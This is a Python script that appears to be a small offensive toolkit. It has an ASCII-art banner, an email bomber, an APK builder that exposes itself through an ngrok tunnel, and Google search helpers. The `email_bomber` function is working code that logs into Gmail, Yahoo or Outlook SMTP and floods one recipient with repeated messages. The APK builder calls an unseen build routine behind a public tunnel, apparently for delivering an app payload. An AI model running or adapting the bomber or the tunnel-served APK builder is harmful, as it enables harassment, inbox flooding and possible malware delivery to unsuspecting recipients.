import os
import smtplib
import socket
from requests import get
from googlesearch import search
from bs4 import BeautifulSoup
import colorama

try:
    from pyngrok import ngrok
except ImportError:
    ngrok = None
    print("[-] pyngrok not found. Install it with: pip install pyngrok")

try:
    from utils import build
except ImportError:
    build = None
    print("[-] Could not import 'build' from utils.py.")

colorama.init(autoreset=True)

class Colors:
    red = colorama.Fore.RED
    blue = colorama.Fore.BLUE
    green = colorama.Fore.GREEN
    magenta = colorama.Fore.MAGENTA
    yellow = colorama.Fore.YELLOW
    reset = colorama.Fore.RESET

def std_output(output_type):
    colors = {
        "info": Colors.green,
        "error": Colors.red,
        "warning": Colors.yellow,
        "fail": Colors.magenta
    }
    return colors.get(output_type.lower(), Colors.reset)

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def validate_port(port):
    return port.isdigit() and 1 <= int(port) <= 65535


def display_kanki():
    kanki = f"""
             {Colors.red}kiya enjil
                                          {Colors.blue}
                                                      ████                
                                                    ██▓▓██                
                                                ████▓▓██████              
                                    ██████████████▓▓██░░████              
                          ██████████████████████▓▓██░░░░████              
                  ████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▓▓██░░░░░░████████          
              ██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██░░░░░░██▓▓▓▓▓▓████        
          ██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░░░░░██▓▓▓▓▓▓▓▓████      
    ██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓████    
    ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██    
██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████  
  ████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██████▓▓▓▓▓▓████
        ██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ██▓▓▓▓████
        ██████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ██▓▓▓▓████
            ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██        ██▓▓██  
        ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██      ██████▓▓██
    ██▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██      ██████████
  ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██████      ██████████
  ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████░░██        ██      
    ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██░░░░██░░██              
      ██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██░░░░░░░░░░██            
            ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██████▓▓▓▓▓▓▓▓██░░░░░░░░░░████████      
                  ██▓▓▓▓▓▓▓▓▓▓▓▓██░░░░▓▓▓▓▓▓▓▓██░░░░░░░░░░██████████      
                  ██▓▓▓▓▓▓▓▓▓▓██░░░░░░░░▓▓▓▓████████████████              
                ██▓▓▓▓▓▓▓▓▓▓▓▓██░░░░██████████      ████                  
        ██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓██░░░░██        ██          ██                
              ██████▓▓▓▓▓▓▓▓██░░██  ████    ██          ██                
    ██████        ██▓▓▓▓██▓▓░░░░██████████  ██          ██                
    ██▒▒▒▒██████████    ████░░░░██░░░░████  ██          ██                
    ██▒▒▒▒▒▒▒▒██          ██░░░░░░░░░░████  ██          ██                
  ██    ▒▒▒▒▒▒██          ██████░░░░░░████  ██        ██                   
  ██    ▒▒▒▒▒▒██          ██▓▓▓▓████████    ██        ██                   
  ██          ██          ██▓▓▓▓████      ██        ████                   
██▒▒▒▒      ░░████      ██▓▓▓▓▓▓▓▓██  ████          ██                     
██▒▒▒▒▒▒    ██    ████████████████████  ████████████                       
██▒▒▒▒▒▒▒▒▒▒██          ██              ██                                
  ██▒▒▒▒▒▒██          ██                ██                                
  ██▒▒▒▒██            ██              ██                                  
    ████                ██              ██                                  
                      ██                ██                                
                      ████████████████████                                
                      ██▒▒▒▒▒▒▒▒▒▒        ████                            
                      ██▒▒▒▒▒▒▒▒          ▒▒▒▒██                          
                      ██▒▒▒▒▒▒▒▒      ▒▒▒▒▒▒▒▒▒▒██                        
                      ██▒▒▒▒▒▒      ▒▒▒▒▒▒▒▒▒▒▒▒██                        
                      ████████████████████████████
    """
    print(kanki)




def email_bomber(server_choice, user, pwd, to, subject, body, count):
    message = f'From: {user}\nSubject: {subject}\n\n{body}'
    sent = 0

    smtp_servers = {
        'gmail': "smtp.gmail.com",
        'yahoo': "smtp.mail.yahoo.com",
        'outlook': "smtp-mail.outlook.com"
    }

    try:
        smtp_server = smtp_servers.get(server_choice.lower())
        if not smtp_server:
            print(std_output("error") + "Invalid email server type.")
            return

        server = smtplib.SMTP(smtp_server, 587)
        server.starttls()
        server.login(user, pwd)

        while sent < count:
            try:
                server.sendmail(user, to, message)
                sent += 1
                print(std_output("info") + f"[+] Sent {sent} email(s)")
            except KeyboardInterrupt:
                print(std_output("fail") + "Cancelled by user.")
                break
            except Exception as e:
                print(std_output("error") + f"Send error: {str(e)}")
                break

        server.quit()
    except Exception as e:
        print(std_output("error") + f"Connection failed: {str(e)}")

def search_google(query):
    try:
        print(std_output("info") + f"Searching Google for: {query}")
        return search(query, num_results=5)
    except Exception as e:
        print(std_output("error") + f"Search error: {str(e)}")
        return []

def fetch_page_html(url):
    try:
        response = get(url)
        return BeautifulSoup(response.text, 'html.parser')
    except Exception as e:
        print(std_output("error") + f"Fetch error: {str(e)}")
        return None

def apk_file_builder(file_name, use_ngrok=False):
    if use_ngrok and ngrok:
        try:
            public_url = ngrok.connect(80)
            print(std_output("info") + f"Ngrok tunnel: {public_url}")
        except Exception as e:
            print(std_output("error") + f"Ngrok error: {str(e)}")

    if build:
        try:
            build(file_name)
            print(std_output("info") + f"APK '{file_name}' built successfully.")
        except Exception as e:
            print(std_output("error") + f"Build error: {str(e)}")
    else:
        print(std_output("error") + "Build function not available.")

if __name__ == "__main__":
    clear_console()
    display_kanki()

    apk_file_builder("myApp.apk", use_ngrok=True)
    results = search_google("openai")

    if results:
        print(std_output("info") + "Search Results:")
        for link in results:
            print(link)


